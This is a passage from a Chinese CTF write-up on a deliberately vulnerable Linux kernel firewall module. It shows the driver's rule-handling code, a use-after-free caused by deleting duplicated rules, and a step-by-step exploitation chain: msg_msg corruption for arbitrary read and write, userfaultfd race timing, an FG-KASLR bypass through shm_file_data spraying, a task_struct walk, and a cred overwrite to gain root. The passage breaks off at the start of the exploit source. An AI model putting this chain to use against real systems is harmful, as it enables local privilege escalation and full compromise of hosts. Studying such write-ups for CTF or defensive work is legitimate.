</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;action = user_rule.</span><span style="color:#bf616a;">action</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;is_duplicated = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_ERR &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_add_rule() new rule added!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SUCCESS;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="firewall-delete-rule">firewall_delete_rule</h3><p>不存在UAF</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">firewall_delete_rule</span><span style="color:#c0c5ce;">(user_rule_t </span><span style="color:#bf616a;">user_rule</span><span style="color:#c0c5ce;">, rule_t **</span><span style="color:#bf616a;">firewall_rules</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_delete_rule() deleting rule!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules[idx] == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_delete_rule() invalid rule slot!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(firewall_rules[idx]);
</span><span style="color:#c0c5ce;">    firewall_rules[idx] = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SUCCESS;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="firewall-edit-rule">firewall_edit_rule</h3><p>可以对属性进行编辑</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">firewall_edit_rule</span><span style="color:#c0c5ce;">(user_rule_t </span><span style="color:#bf616a;">user_rule</span><span style="color:#c0c5ce;">, rule_t **</span><span style="color:#bf616a;">firewall_rules</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_edit_rule() editing rule!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> EASY_MODE
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Note that description editing is not implemented.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules[idx] == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_edit_rule() invalid idx!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(firewall_rules[idx]-&gt;iface, user_rule.</span><span style="color:#bf616a;">iface</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(firewall_rules[idx]-&gt;name, user_rule.</span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">in4_pton</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">strnlen</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">), (u8 *)&amp;(firewall_rules[idx]-&gt;ip), -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_ERR &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_edit_rule() invalid IP format!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">in4_pton</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">strnlen</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">), (u8 *)&amp;(firewall_rules[idx]-&gt;netmask), -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_ERR &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_edit_rule() invalid Netmask format!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;proto = user_rule.</span><span style="color:#bf616a;">proto</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;port = </span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">port</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;action = user_rule.</span><span style="color:#bf616a;">action</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_ERR &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_edit_rule() rule edited!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SUCCESS;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="firewall-show-rule">firewall_show_rule</h3><p>没东西</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">firewall_show_rule</span><span style="color:#c0c5ce;">(user_rule_t </span><span style="color:#bf616a;">user_rule</span><span style="color:#c0c5ce;">, rule_t **</span><span style="color:#bf616a;">firewall_rules</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Function not implemented.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="firewall-dup-rule">firewall_dup_rule</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">firewall_dup_rule</span><span style="color:#c0c5ce;">(user_rule_t </span><span style="color:#bf616a;">user_rule</span><span style="color:#c0c5ce;">, rule_t **</span><span style="color:#bf616a;">firewall_rules</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// dup和firwall_rule要统一属性
</span><span style="color:#c0c5ce;">    uint8_t i;
</span><span style="color:#c0c5ce;">    rule_t **dup;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_dup_rule() duplicating rule!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 选择对应的rules list
</span><span style="color:#c0c5ce;">    dup = (user_rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">== INBOUND) ? firewall_rules_out : firewall_rules_in;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules[idx] == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_dup_rule() nothing to duplicate!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 判断是否已经被dup，有则返回ERROR
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules[idx]-&gt;is_duplicated)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_dup_rule() rule already duplicated before!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 找到list上的一个空位，存放dup的rule，并将is_duplicated位置1
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 显然漏洞点出现了，在上面delete时没有判断is_duplicated，存在UAF
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; MAX_RULES; i++)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(dup[i] == </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            dup[i] = firewall_rules[idx];
</span><span style="color:#c0c5ce;">            firewall_rules[idx]-&gt;is_duplicated = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_dup_rule() rule duplicated!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SUCCESS;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_dup_rule() nowhere to duplicate!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="lou-dong-li-yong">漏洞利用</h2><p>漏洞即在于delete的时候没有检查<code>is_duplicated</code>位，造成UAF</p>
<p>需要注意dup是对称的：<code>dup = (user_rule.type == INBOUND) ? firewall_rules_out : firewall_rules_in;</code>，即如<code>firewall_rules_out</code>的链表会dup到<code>firwall_ruels_in</code>，反之亦然，不是在同一个list中dup</p>
<p>且由于标志位，每一个rule只能dup一次</p>
<p>UAF的对象属于kmalloc-4096，且可以配合edit完成UAF-write。但edit限制了只能任意写UAF对象部分长度</p>
<p><strong>任意读</strong>：hardened_usercopy 机制不允许修改size越界读写。可利用UAF篡改msg_msg-&gt;m_ts和msg_msg-&gt;next（指向的下一个segment前8字节必须为null，避免遍历消息时出现访存崩溃）</p>
<p><strong>任意写</strong>：创建一个需要多次分配堆块的消息（&gt;0xfd0），在拷贝消息头（msg_msg结构）的时候利用userfaultfd进行挂起，然后利用UAF篡改<code>msg_msg-&gt;next</code>指向目标地址，目标地址的前8字节必须为NULL（避免崩溃），解除挂起后就能实现任意写。任意写的原理如下图所示：</p>
<p><img src="https://md.buptmerak.cn/uploads/9e20f150-e290-434e-8358-cf1007f8539f.png" alt="" /></p>
<h3 id="xie-lu-nei-he-ji-zhi">泄露内核基址</h3><p>由于开启了<code>FG-KASLR</code>，只能喷射大量<code>shm_file_data</code>对象（kmalloc-32）来泄露地址，因为<code>FG-KASLR</code>是在boot时对函数和某些节进行二次随机化，而<code>shm_file_data-&gt;ns</code>这种指向全局结构的指针不会被二次随机化。我们可以传入消息来分配1个kmalloc-4096的消息头和1个kmalloc-32的segment，然后利用UAF<strong>改大</strong><code>msg_msg-&gt;m_ts</code>，调用<code>msgrcv()</code>读内存，这样就能越界读取多个kmalloc-32结构，泄露地址。注意，需使用<code>MSG_COPY flag</code>避免unlink时崩溃，且<code>msg_msg</code>不出队，可以一直用edit进行多次写入操作。原理如下图所示：</p>
<p><img src="https://md.buptmerak.cn/uploads/ab9b8040-ccaa-4d4f-ad4d-b12d3780df74.png" alt="" /></p>
<p>调试细节如下</p>
<p>第一次<code>msgsnd</code>创建长度为0x1010-0x30的消息</p>
<p><img src="https://md.buptmerak.cn/uploads/f607c132-b52f-468b-85dc-fc326584e1ce.png" alt="" /></p>
<p><img src="https://md.buptmerak.cn/uploads/557dac85-67b0-478f-9dce-ae77bf48dff5.png" alt="" /></p>
<p>因为长度<code>0xfe0&gt;0xfd0=PAGE_SIZE-sizeof(struct msg_msg)</code>，故在<code>alloc_msg</code>中进入下方的while循环中申请第二块seg存放消息。第一块msg_msg中next指针指向下一块msg_msgseg</p>
<p>喷射<code>shm_data_file</code>结构体（调试方法，断点下到<code>do_msgsnd</code>，并查看<code>load_msg</code>地址，然后在<code>call load_msg</code>处打断点，查看返回值即为分配得到的<code>msg_msg</code>地址）
堆喷前：</p>
<p><img src="https://md.buptmerak.cn/uploads/20ec3ef4-4b76-4a84-b7b8-17abaf142b2e.png" alt="" /></p>
<p>堆喷后：</p>
<p><img src="https://md.buptmerak.cn/uploads/ea7792ac-b7ae-449d-b066-93257f5d9c89.png" alt="" /></p>
<p>UAF修改<code>m_ts</code>；设置<code>MSG_COPY</code>，因为<code>msg_msg</code>头部的<code>m_list</code>被改掉了，不设置会执行<code>list_del</code>做unlink，导致crash</p>
<p><img src="https://md.buptmerak.cn/uploads/cb1ef08b-b066-476b-9ecf-72d021d1645a.png" alt="" /></p>
<p><img src="https://md.buptmerak.cn/uploads/4919b358-a543-4eb4-98a4-43e089ea673d.png" alt="" /></p>
<h3 id="xie-lu-creddi-zhi">泄露cred地址</h3><p>再次利用任意读，从<code>init_task</code>开始找到当前进程的<code>task_struct</code>（也可以调用 prctl SET_NAME来设置comm成员，以此标志来暴搜，详见 <a href="https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308">Google CTF Quals 2021 Fullchain writeup</a>）。本题提供了vmlinux符号信息，<code>task_struct-&gt;tasks</code>偏移是0x298，该位置的前8字节为null，可以当作1个segment；<code>real_cred</code>和<code>cred</code>指针在偏移0x538和0x540处，前面8字节也是null</p>
<p>利用上一步UAF控制的<code>msg_msg</code>，修改<code>nextz</code>指针指向当前task_struct的<code>prev-0x8</code>，空出来8字节是作为<code>msg_msgseg</code>的<code>next</code>指针，正好为null；task链表指针和进程pid均在下方可以被读出</p>
<p><img src="https://md.buptmerak.cn/uploads/201cb37a-a468-4af1-95af-37de6f4b51f8.png" alt="" /></p>
<h3 id="cuan-gai-cred-real-credzhi-zhen">篡改cred & real_cred指针</h3><p>根据pid找到当前进程后，利用UAF篡改<code>msg_msg-&gt;next</code>指向<code>&amp;real_cred-0x8</code>，调用<code>msgsnd()</code>写内存，即可将<code>real_cred</code>和<code>cred</code>指针替换为<code>init_cred</code>即可提权</p>
<p>这里需要在执行<code>copy_from_user</code>之前将<code>msg_msg</code>的<code>next</code>指针修改指向目标区域，故使用userfaultfd，在缺页处理的时候利用UAF修改指针，并进行编辑操作修改<code>real_cred</code>和<code>cred</code>指针</p>
<p><img src="https://md.buptmerak.cn/uploads/ac54893c-025b-4a39-8d3d-1297186c387c.png" alt="" /></p>
<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
<span style="color:#65737e;">// gcc exp.c  -o exp --static -lpthread -O3 -s
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">pthread.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">signal.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/syscall.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdint.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/prctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/userfaultfd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">poll.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">assert.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">byteswap.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">time.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/timerfd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ipc.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/msg.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/socket.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/reboot.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">arpa/inet.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/shm.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">UFFDIO_API </span><span style="color:#d08770;">0xc018aa3f
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">UFFDIO_REGISTER </span><span style="color:#d08770;">0xc020aa00
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">UFFDIO_UNREGISTER </span><span style="color:#d08770;">0x8010aa01
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">UFFDIO_COPY </span><span style="color:#d08770;">0xc028aa03
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">UFFDIO_ZEROPAGE </span><span style="color:#d08770;">0xc020aa04
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">UFFDIO_WAKE </span><span style="color:#d08770;">0x8010aa02
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ADD_RULE </span><span style="color:#d08770;">0x1337babe
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DELETE_RULE </span><span style="color:#d08770;">0xdeadbabe
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">EDIT_RULE </span><span style="color:#d08770;">0x1337beef
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">SHOW_RULE </span><span style="color:#d08770;">0xdeadbeef
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DUP_RULE </span><span style="color:#d08770;">0xbaad5aad
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">INBOUND </span><span style="color:#d08770;">0
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">OUTBOUND </span><span style="color:#d08770;">1
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DESC_MAX </span><span style="color:#d08770;">0x800
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef struct
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> iface[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ip[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> netmask[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    uint8_t idx;
</span><span style="color:#c0c5ce;">    uint8_t type;
</span><span style="color:#c0c5ce;">    uint16_t proto;
</span><span style="color:#c0c5ce;">    uint16_t port;
</span><span style="color:#c0c5ce;">    uint8_t action;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> desc[DESC_MAX];
</span><span style="color:#c0c5ce;">} user_rule_t;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef struct 
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mtype;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> mtext[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">}msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef struct 
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ll_next;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*ll_prev;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> m_type;
</span><span style="color:#c0c5ce;">    size_t m_ts;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*next;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*security;
</span><span style="color:#c0c5ce;">}msg_header;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd;
</span><span style="color:#c0c5ce;">uint32_t target_idx;
